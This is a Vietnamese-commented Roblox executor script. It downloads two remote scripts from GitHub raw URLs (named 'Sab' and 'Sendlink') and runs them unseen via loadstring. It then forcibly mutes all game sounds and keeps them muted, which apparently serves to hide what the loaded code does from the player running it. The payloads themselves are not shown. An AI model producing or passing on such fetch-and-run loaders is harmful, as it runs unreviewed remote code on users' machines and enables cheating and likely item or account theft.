-- RunWithTwoAndMute.lua
-- Chạy 2 script từ URL rồi chạy chế độ mute "thân thiện" (client-side).
-- Dán vào executor hoặc LocalScript.

-- ======= CÀI ĐẶT (chỉnh nếu cần) =======
local URLS = {
	"https://raw.githubusercontent.com/NoobRoblox/Finder/refs/heads/main/Sab",
	"https://raw.githubusercontent.com/NoobRoblox/Test/refs/heads/main/Sendlink"
}
local MUTE_GUI_SOUNDS = true   -- true = cũng tắt âm GUI; false = giữ âm GUI
local WHITELIST_NAMES = {      -- tên Sound muốn giữ (ví dụ "MyImportantSound")
	-- "KeepThisSound"
}
local BACKUP_INTERVAL = 8      -- giây, khoảng thời gian backup nhẹ nhàng để ép lại volume
-- =======================================

-- safe load và run 1 url
local function safeLoadAndRun(url)
	if not url or url == "" then return end
	local ok, src = pcall(game.HttpGet or function() end, game, url) -- some executors use game:HttpGet
	if not ok or type(src) ~= "string" then
		-- try alternative if game:HttpGet not available
		local ok2, src2 = pcall(function() return game:HttpGet(url) end)
		if ok2 and type(src2) == "string" then src = src2 else return false, "Fetch failed" end
	end
	local f
	local ok3, err = pcall(function()
		f = loadstring(src)
	end)
	if not ok3 or type(f) ~= "function" then
		return false, ("loadstring failed: %s"):format(tostring(err))
	end
	local ok4, res = pcall(f)
	if not ok4 then
		return false, ("script runtime error: %s"):format(tostring(res))
	end
	return true
end

-- chạy tuần tự các URL (pcall để không crash)
for _, url in ipairs(URLS) do
	local ok, err = safeLoadAndRun(url)
	if not ok then
		-- in lỗi (không làm crash)
		pcall(function() warn(("RunWithTwoAndMute: url failed: %s -> %s"):format(tostring(url), tostring(err))) end)
	else
		pcall(function() print(("RunWithTwoAndMute: loaded %s"):format(url)) end)
	end
end

-- ======= Phần mute "thân thiện" (không xung đột) =======
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local weak = { __mode = "k" }
local tracked = setmetatable({}, weak) -- [sound] = {connVolume, connPlaying, connAncestry}

local function isWhitelisted(sound)
	if not sound or not sound.Name then return false end
	for _, name in ipairs(WHITELIST_NAMES) do
		if sound.Name == name then return true end
	end
	return false
end

local function isGuiDescendant(inst)
	if not player or not player:FindFirstChild("PlayerGui") then return false end
	return inst:IsDescendantOf(player.PlayerGui)
end

local function safeSetVolumeZero(sound)
	pcall(function()
		if not sound or not sound.Parent then return end
		if sound.Volume ~= 0 then sound.Volume = 0 end
		if sound.Playing then
			pcall(function() sound:Stop() end)
		end
	end)
end

local function untrackSound(sound)
	local entry = tracked[sound]
	if entry then
		pcall(function()
			if entry.connVolume then entry.connVolume:Disconnect() end
			if entry.connPlaying then entry.connPlaying:Disconnect() end
			if entry.connAncestry then entry.connAncestry:Disconnect() end
		end)
		tracked[sound] = nil
	end
end

local function trackSound(sound)
	if not sound or not sound:IsA("Sound") then return end
	if tracked[sound] then return end
	if isWhitelisted(sound) then return end
	if (not MUTE_GUI_SOUNDS) and isGuiDescendant(sound) then return end

	-- mute ngay
	safeSetVolumeZero(sound)

	-- theo dõi volume thay đổi
	local connVol = nil
	pcall(function()
		connVol = sound:GetPropertyChangedSignal("Volume"):Connect(function()
			-- reset nếu ai đó chỉnh
			if sound and sound.Parent then
				pcall(function()
					if sound.Volume ~= 0 then sound.Volume = 0 end
				end)
			end
		end)
	end)

	-- theo dõi Playing thay đổi
	local connPlay = nil
	pcall(function()
		connPlay = sound:GetPropertyChangedSignal("Playing"):Connect(function()
			if sound and sound.Parent then
				pcall(function()
					if sound.Playing then sound:Stop() end
				end)
			end
		end)
	end)

	-- dọn khi bị remove
	local connAnc = nil
	pcall(function()
		connAnc = sound.AncestryChanged:Connect(function()
			if not sound:IsDescendantOf(game) then
				untrackSound(sound)
			end
		end)
	end)

	tracked[sound] = {connVolume = connVol, connPlaying = connPlay, connAncestry = connAnc}
end

-- quét tất cả hiện có (sau khi 2 script đã chạy)
for _, obj in ipairs(game:GetDescendants()) do
	if obj:IsA("Sound") then
		trackSound(obj)
	end
end

-- theo dõi âm mới sinh ra
game.DescendantAdded:Connect(function(desc)
	task.defer(function()
		if not desc or not desc.Parent then return end
		if desc:IsA("Sound") then
			trackSound(desc)
			return
		end
		-- nếu container mới có sounds
		for _, c in ipairs(desc:GetChildren()) do
			if c:IsA("Sound") then
				trackSound(c)
			end
		end
	end)
end)

-- backup nhẹ nhàng (để xử lý trường hợp volume bị ghi đè theo chu kỳ)
task.spawn(function()
	while true do
		task.wait(BACKUP_INTERVAL)
		for s, _ in pairs(tracked) do
			if s and s.Parent then
				safeSetVolumeZero(s)
			else
				untrackSound(s)
			end
		end
	end
end)

